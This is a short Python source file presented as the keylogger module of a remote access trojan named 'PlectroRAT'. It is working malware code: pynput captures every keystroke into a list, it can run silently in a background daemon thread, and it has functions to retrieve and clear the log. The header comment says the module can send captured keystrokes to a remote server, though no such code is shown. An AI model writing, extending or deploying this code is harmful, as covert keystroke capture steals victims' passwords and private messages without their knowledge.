

# Keylogger module for PlectroRAT
# This module captures keystrokes and optionally saves them to a file or sends them to a remote server

from pynput import keyboard
import threading

log = []

def on_press(key):
    try:
        log.append(key.char)
    except AttributeError:
        log.append(f"[{key.name}]")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return listener

def get_log():
    return ''.join(log)

def clear_log():
    global log
    log = []

# Optionally: run the keylogger in a background thread
def run_background():
    thread = threading.Thread(target=start_keylogger, daemon=True)
    thread.start()